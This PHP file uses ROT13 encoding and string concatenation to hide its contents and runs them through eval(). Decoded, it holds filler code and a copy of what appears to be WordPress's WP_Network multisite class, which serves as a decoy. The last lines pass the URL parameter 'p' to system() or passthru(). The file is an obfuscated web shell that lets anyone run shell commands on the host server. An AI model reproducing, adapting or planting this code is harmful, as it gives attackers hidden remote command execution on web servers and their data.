<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Argjbex NCV: JC_Argjbex pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Zhygvfvgr
 * @fvapr 4.4.0
 */

/**
 * Pber pynff hfrq sbe vagrenpgvat jvgu n zhygvfvgr argjbex.
 *
 * Guvf pynff vf hfrq qhevat ybnq gb cbchyngr gur `$pheerag_fvgr` tybony naq
 * frghc gur pheerag argjbex.
 *
 * Guvf pynff vf zbfg hfrshy va JbeqCerff zhygv-argjbex vafgnyyngvbaf jurer gur
 * novyvgl gb vagrenpg jvgu nal argjbex bs fvgrf vf erdhverq.
 *
 * @fvapr 4.4.0
 *
 * @cebcregl vag $vq
 * @cebcregl vag $fvgr_vq
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_Argjbex {

	/**
	 * Argjbex VQ.
	 *
	 * @fvapr 4.4.0
	 * @fvapr 4.6.0 Pbairegrq sebz choyvp gb cevingr gb rkcyvpvgyl ranoyr zber vaghvgvir
	 *              npprff ivn zntvp zrgubqf. Nf cneg bs gur npprff punatr, gur glcr jnf
	 *              nyfb punatrq sebz `fgevat` gb `vag`.
	 * @ine vag
	 */
	cevingr $vq;

	/**
	 * Qbznva bs gur argjbex.
	 *
	 * @fvapr 4.4.0
	 * @ine fgevat
	 */
	choyvp $qbznva = '';

	/**
	 * Cngu bs gur argjbex.
	 *
	 * @fvapr 4.4.0
	 * @ine fgevat
	 */
	choyvp $cngu = '';

	/**
	 * Gur VQ bs gur argjbex'f znva fvgr.
	 *
	 * Anzrq \"oybt\" if. \"fvgr\" sbe yrtnpl ernfbaf. N znva fvgr vf znccrq gb
	 * gur argjbex jura gur argjbex vf perngrq.
	 *
	 * N ahzrevp fgevat, sbe pbzcngvovyvgl ernfbaf.
	 *
	 * @fvapr 4.4.0
	 * @ine fgevat
	 */
	cevingr $oybt_vq = '0';

	/**
	 * Qbznva hfrq gb frg pbbxvrf sbe guvf argjbex.
	 *
	 * @fvapr 4.4.0
	 * @ine fgevat
	 */
	choyvp $pbbxvr_qbznva = '';

	/**
	 * Anzr bs guvf argjbex.
	 *
	 * Anzrq \"fvgr\" if. \"argjbex\" sbe yrtnpl ernfbaf.
	 *
	 * @fvapr 4.4.0
	 * @ine fgevat
	 */
	choyvp $fvgr_anzr = '';

	/**
	 * Ergevrirf n argjbex sebz gur qngnonfr ol vgf VQ.
	 *
	 * @fvapr 4.4.0
	 *
	 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
	 *
	 * @cnenz vag $argjbex_vq Gur VQ bs gur argjbex gb ergevrir.
	 * @erghea JC_Argjbex|snyfr Gur argjbex'f bowrpg vs sbhaq. Snyfr vs abg.
	 */
	choyvp fgngvp shapgvba trg_vafgnapr( $argjbex_vq ) {
		tybony $jcqo;

		$argjbex_vq = (vag) $argjbex_vq;
		vs ( ! $argjbex_vq ) {
			erghea snyfr;
		}

		$_argjbex = jc_pnpur_trg( $argjbex_vq, 'argjbexf' );

		vs ( snyfr === $_argjbex ) {
			$_argjbex = $jcqo->trg_ebj( $jcqo->cercner( \"FRYRPG * SEBZ {$jcqo->fvgr} JURER vq = %q YVZVG 1\", $argjbex_vq ) );

			vs ( rzcgl( $_argjbex ) || vf_jc_reebe( $_argjbex ) ) {
				$_argjbex = -1;
			}

			jc_pnpur_nqq( $argjbex_vq, $_argjbex, 'argjbexf' );
		}

		vs ( vf_ahzrevp( $_argjbex ) ) {
			erghea snyfr;
		}

		erghea arj JC_Argjbex( $_argjbex );
	}

	/**
	 * Perngrf n arj JC_Argjbex bowrpg.
	 *
	 * Jvyy cbchyngr bowrpg cebcregvrf sebz gur bowrpg cebivqrq naq nffvta bgure
	 * qrsnhyg cebcregvrf onfrq ba gung vasbezngvba.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz JC_Argjbex|bowrpg $argjbex N argjbex bowrpg.
	 */
	choyvp shapgvba __pbafgehpg( $argjbex ) {
		sbernpu ( trg_bowrpg_inef( $argjbex ) nf $xrl => $inyhr ) {
			$guvf->__frg( $xrl, $inyhr );
		}

		$guvf->_frg_fvgr_anzr();
		$guvf->_frg_pbbxvr_qbznva();
	}

	/**
	 * Trggre.
	 *
	 * Nyybjf pheerag zhygvfvgr anzvat pbairagvbaf jura trggvat cebcregvrf.
	 *
	 * @fvapr 4.6.0
	 *
	 * @cnenz fgevat $xrl Cebcregl gb trg.
	 * @erghea zvkrq Inyhr bs gur cebcregl. Ahyy vs abg ninvynoyr.
	 */
	choyvp shapgvba __trg( $xrl ) {
		fjvgpu ( $xrl ) {
			pnfr 'vq':
				erghea (vag) $guvf->vq;
			pnfr 'oybt_vq':
				erghea (fgevat) $guvf->trg_znva_fvgr_vq();
			pnfr 'fvgr_vq':
				erghea $guvf->trg_znva_fvgr_vq();
		}

		erghea ahyy;
	}

	/**
	 * Vffrg-re.
	 *
	 * Nyybjf pheerag zhygvfvgr anzvat pbairagvbaf jura purpxvat sbe cebcregvrf.
	 *
	 * @fvapr 4.6.0
	 *
	 * @cnenz fgevat $xrl Cebcregl gb purpx vs frg.
	 * @erghea obby Jurgure gur cebcregl vf frg.
	 */
	choyvp shapgvba __vffrg( $xrl ) {
		fjvgpu ( $xrl ) {
			pnfr 'vq':
			pnfr 'oybt_vq':
			pnfr 'fvgr_vq':
				erghea gehr;
		}

		erghea snyfr;
	}

	/**
	 * Frggre.
	 *
	 * Nyybjf pheerag zhygvfvgr anzvat pbairagvbaf juvyr frggvat cebcregvrf.
	 *
	 * @fvapr 4.6.0
	 *
	 * @cnenz fgevat $xrl   Cebcregl gb frg.
	 * @cnenz zvkrq  $inyhr Inyhr gb nffvta gb gur cebcregl.
	 */
	choyvp shapgvba __frg( $xrl, $inyhr ) {
		fjvgpu ( $xrl ) {
			pnfr 'vq':
				$guvf->vq = (vag) $inyhr;
				oernx;
			pnfr 'oybt_vq':
			pnfr 'fvgr_vq':
				$guvf->oybt_vq = (fgevat) $inyhr;
				oernx;
			qrsnhyg:
				$guvf->$xrl = $inyhr;
		}
	}

	/**
	 * Ergheaf gur znva fvgr VQ sbe gur argjbex.
	 *
	 * Vagreany zrgubq hfrq ol gur zntvp trggre sbe gur 'oybt_vq' naq 'fvgr_vq'
	 * cebcregvrf.
	 *
	 * @fvapr 4.9.0
	 *
	 * @erghea vag Gur VQ bs gur znva fvgr.
	 */
	cevingr shapgvba trg_znva_fvgr_vq() {
		/**
		 * Svygref gur znva fvgr VQ.
		 *
		 * Ergheavat n cbfvgvir vagrtre jvyy rssrpgviryl fubeg-pvephvg gur shapgvba.
		 *
		 * @fvapr 4.9.0
		 *
		 * @cnenz vag|ahyy   $znva_fvgr_vq Vs n cbfvgvir vagrtre vf erghearq, vg vf vagrecergrq nf gur znva fvgr VQ.
		 * @cnenz JC_Argjbex $argjbex      Gur argjbex bowrpg sbe juvpu gur znva fvgr jnf qrgrpgrq.
		 */
		$znva_fvgr_vq = (vag) nccyl_svygref( 'cer_trg_znva_fvgr_vq', ahyy, $guvf );

		vs ( 0 < $znva_fvgr_vq ) {
			erghea $znva_fvgr_vq;
		}

		vs ( 0 < (vag) $guvf->oybt_vq ) {
			erghea (vag) $guvf->oybt_vq;
		}

		vs ( ( qrsvarq( 'QBZNVA_PHEERAG_FVGR' ) && qrsvarq( 'CNGU_PHEERAG_FVGR' )
			&& QBZNVA_PHEERAG_FVGR === $guvf->qbznva && CNGU_PHEERAG_FVGR === $guvf->cngu )
			|| ( qrsvarq( 'FVGR_VQ_PHEERAG_FVGR' ) && (vag) FVGR_VQ_PHEERAG_FVGR === $guvf->vq )
		) {
			vs ( qrsvarq( 'OYBT_VQ_PHEERAG_FVGR' ) ) {
				$guvf->oybt_vq = (fgevat) OYBT_VQ_PHEERAG_FVGR;

				erghea (vag) $guvf->oybt_vq;
			}

			vs ( qrsvarq( 'OYBTVQ_PHEERAG_FVGR' ) ) { // Qrcerpngrq.
				$guvf->oybt_vq = (fgevat) OYBTVQ_PHEERAG_FVGR;

				erghea (vag) $guvf->oybt_vq;
			}
		}

		$fvgr = trg_fvgr();
		vs ( $fvgr->qbznva === $guvf->qbznva && $fvgr->cngu === $guvf->cngu ) {
			$znva_fvgr_vq = (vag) $fvgr->vq;
		} ryfr {

			$znva_fvgr_vq = trg_argjbex_bcgvba( $guvf->vq, 'znva_fvgr' );
			vs ( snyfr === $znva_fvgr_vq ) {
				$_fvgrf       = trg_fvgrf(
					neenl(
						'svryqf'     => 'vqf',
						'ahzore'     => 1,
						'qbznva'     => $guvf->qbznva,
						'cngu'       => $guvf->cngu,
						'argjbex_vq' => $guvf->vq,
					)
				);
				$znva_fvgr_vq = ! rzcgl( $_fvgrf ) ? neenl_fuvsg( $_fvgrf ) : 0;

				hcqngr_argjbex_bcgvba( $guvf->vq, 'znva_fvgr', $znva_fvgr_vq );
			}
		}

		$guvf->oybt_vq = (fgevat) $znva_fvgr_vq;

		erghea (vag) $guvf->oybt_vq;
	}

	/**
	 * Frgf gur fvgr anzr nffvtarq gb gur argjbex vs bar unf abg orra cbchyngrq.
	 *
	 * @fvapr 4.4.0
	 */
	cevingr shapgvba _frg_fvgr_anzr() {
		vs ( ! rzcgl( $guvf->fvgr_anzr ) ) {
			erghea;
		}

		$qrsnhyg         = hpsvefg( $guvf->qbznva );
		$guvf->fvgr_anzr = trg_argjbex_bcgvba( $guvf->vq, 'fvgr_anzr', $qrsnhyg );
	}

	/**
	 * Frgf gur pbbxvr qbznva onfrq ba gur argjbex qbznva vs bar unf
	 * abg orra cbchyngrq.
	 *
	 * @gbqb Jung vs gur qbznva bs gur argjbex qbrfa'g zngpu gur pheerag fvgr?
	 *
	 * @fvapr 4.4.0
	 */
	cevingr shapgvba _frg_pbbxvr_qbznva() {
		vs ( ! rzcgl( $guvf->pbbxvr_qbznva ) ) {
			erghea;
		}
		$qbznva              = cnefr_hey( $guvf->qbznva, CUC_HEY_UBFG );
		$guvf->pbbxvr_qbznva = vf_fgevat( $qbznva ) ? $qbznva : $guvf->qbznva;
		vs ( fge_fgnegf_jvgu( $guvf->pbbxvr_qbznva, 'jjj.' ) ) {
			$guvf->pbbxvr_qbznva = fhofge( $guvf->pbbxvr_qbznva, 4 );
		}
	}

	/**
	 * Ergevrirf gur pybfrfg zngpuvat argjbex sbe n qbznva naq cngu.
	 *
	 * Guvf jvyy abg arprffnevyl erghea na rknpg zngpu sbe n qbznva naq cngu. Vafgrnq, vg
	 * oernxf gur qbznva naq cngu vagb cvrprf gung ner gura hfrq gb zngpu gur pybfrfg
	 * cbffvovyvgl sebz n dhrel.
	 *
	 * Gur vagrag bs guvf zrgubq vf gb zngpu n argjbex qhevat obbgfgenc sbe n
	 * erdhrfgrq fvgr nqqerff.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz fgevat   $qbznva   Qbznva gb purpx.
	 * @cnenz fgevat   $cngu     Cngu gb purpx.
	 * @cnenz vag|ahyy $frtzragf Cngu frtzragf gb hfr. Qrsnhygf gb ahyy, be gur shyy cngu.
	 * @erghea JC_Argjbex|snyfr Argjbex bowrpg vs fhpprffshy. Snyfr jura ab argjbex vf sbhaq.
	 */
	choyvp fgngvp shapgvba trg_ol_cngu( $qbznva = '', $cngu = '', $frtzragf = ahyy ) {
		$qbznvaf = neenl( $qbznva );
		$cvrprf  = rkcybqr( '.', $qbznva );

		/*
		 * Vg'f cbffvoyr bar qbznva gb frnepu vf 'pbz', ohg vg zvtug nf jryy
		 * or 'ybpnyubfg' be fbzr bgure ybpnyyl znccrq qbznva.
		 */
		juvyr ( neenl_fuvsg( $cvrprf ) ) {
			vs ( ! rzcgl( $cvrprf ) ) {
				$qbznvaf[] = vzcybqr( '.', $cvrprf );
			}
		}

		/*
		 * Vs jr'ir tbggra gb guvf shapgvba qhevat abezny rkrphgvba, gurer vf
		 * zber guna bar argjbex vafgnyyrq. Ng guvf cbvag, jub xabjf ubj znal
		 * jr unir. Nggrzcg gb bcgvzvmr sbe gur fvghngvba jurer argjbexf ner
		 * bayl qbznvaf, guhf zrnavat cnguf arire arrq gb or pbafvqrerq.
		 *
		 * Guvf vf n irel onfvp bcgvzvmngvba; nalguvat shegure pbhyq unir
		 * qenjonpxf qrcraqvat ba gur frghc, fb guvf vf orfg qbar cre-vafgnyyngvba.
		 */
		$hfvat_cnguf = gehr;
		vs ( jc_hfvat_rkg_bowrpg_pnpur() ) {
			$hfvat_cnguf = trg_argjbexf(
				neenl(
					'ahzore'       => 1,
					'pbhag'        => gehr,
					'cngu__abg_va' => '/',
				)
			);
		}

		$cnguf = neenl();
		vs ( $hfvat_cnguf ) {
			$cngu_frtzragf = neenl_svygre( rkcybqr( '/', gevz( $cngu, '/' ) ) );

			/**
			 * Svygref gur ahzore bs cngu frtzragf gb pbafvqre jura frnepuvat sbe n fvgr.
			 *
			 * @fvapr 3.9.0
			 *
			 * @cnenz vag|ahyy $frtzragf Gur ahzore bs cngu frtzragf gb pbafvqre. JbeqCerff ol qrsnhyg ybbxf ng
			 *                           bar cngu frtzrag. Gur shapgvba qrsnhyg bs ahyy bayl znxrf frafr jura lbh
			 *                           xabj gur erdhrfgrq cngu fubhyq zngpu n argjbex.
			 * @cnenz fgevat   $qbznva   Gur erdhrfgrq qbznva.
			 * @cnenz fgevat   $cngu     Gur erdhrfgrq cngu, va shyy.
			 */
			$frtzragf = nccyl_svygref( 'argjbex_ol_cngu_frtzragf_pbhag', $frtzragf, $qbznva, $cngu );

			vs ( ( ahyy !== $frtzragf ) && pbhag( $cngu_frtzragf ) > $frtzragf ) {
				$cngu_frtzragf = neenl_fyvpr( $cngu_frtzragf, 0, $frtzragf );
			}

			juvyr ( pbhag( $cngu_frtzragf ) ) {
				$cnguf[] = '/' . vzcybqr( '/', $cngu_frtzragf ) . '/';
				neenl_cbc( $cngu_frtzragf );
			}

			$cnguf[] = '/';
		}

		/**
		 * Qrgrezvarf n argjbex ol vgf qbznva naq cngu.
		 *
		 * Guvf nyybjf bar gb fubeg-pvephvg gur qrsnhyg ybtvp, creuncf ol
		 * ercynpvat vg jvgu n ebhgvar gung vf zber bcgvzny sbe lbhe frghc.
		 *
		 * Erghea ahyy gb nibvq gur fubeg-pvephvg. Erghea snyfr vs ab argjbex
		 * pna or sbhaq ng gur erdhrfgrq qbznva naq cngu. Bgurejvfr, erghea
		 * na bowrpg sebz jc_trg_argjbex().
		 *
		 * @fvapr 3.9.0
		 *
		 * @cnenz ahyy|snyfr|JC_Argjbex $argjbex  Argjbex inyhr gb erghea ol cngu. Qrsnhyg ahyy
		 *                                        gb pbagvahr ergevrivat gur argjbex.
		 * @cnenz fgevat                $qbznva   Gur erdhrfgrq qbznva.
		 * @cnenz fgevat                $cngu     Gur erdhrfgrq cngu, va shyy.
		 * @cnenz vag|ahyy              $frtzragf Gur fhttrfgrq ahzore bs cnguf gb pbafhyg.
		 *                                        Qrsnhyg ahyy, zrnavat gur ragver cngu jnf gb or pbafhygrq.
		 * @cnenz fgevat[]              $cnguf    Neenl bs cnguf gb frnepu sbe, onfrq ba `$cngu` naq `$frtzragf`.
		 */
		$cer = nccyl_svygref( 'cer_trg_argjbex_ol_cngu', ahyy, $qbznva, $cngu, $frtzragf, $cnguf );
		vs ( ahyy !== $cer ) {
			erghea $cer;
		}

		vs ( ! $hfvat_cnguf ) {
			$argjbexf = trg_argjbexf(
				neenl(
					'ahzore'     => 1,
					'beqreol'    => neenl(
						'qbznva_yratgu' => 'QRFP',
					),
					'qbznva__va' => $qbznvaf,
				)
			);

			vs ( ! rzcgl( $argjbexf ) ) {
				erghea neenl_fuvsg( $argjbexf );
			}

			erghea snyfr;
		}

		$argjbexf = trg_argjbexf(
			neenl(
				'beqreol'    => neenl(
					'qbznva_yratgu' => 'QRFP',
					'cngu_yratgu'   => 'QRFP',
				),
				'qbznva__va' => $qbznvaf,
				'cngu__va'   => $cnguf,
			)
		);

		/*
		 * Qbznvaf ner fbegrq ol yratgu bs qbznva, gura ol yratgu bs cngu.
		 * Gur qbznva zhfg zngpu sbe gur cngu gb or pbafvqrerq. Bgurejvfr,
		 * n argjbex jvgu gur cngu bs / jvyy fhssvpr.
		 */
		$sbhaq = snyfr;
		sbernpu ( $argjbexf nf $argjbex ) {
			vs ( ( $argjbex->qbznva === $qbznva ) || ( \"jjj.{$argjbex->qbznva}\" === $qbznva ) ) {
				vs ( va_neenl( $argjbex->cngu, $cnguf, gehr ) ) {
					$sbhaq = gehr;
					oernx;
				}
			}
			vs ( '/' === $argjbex->cngu ) {
				$sbhaq = gehr;
				oernx;
			}
		}

		vs ( gehr === $sbhaq ) {
			erghea $argjbex;
		}

		erghea snyfr;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>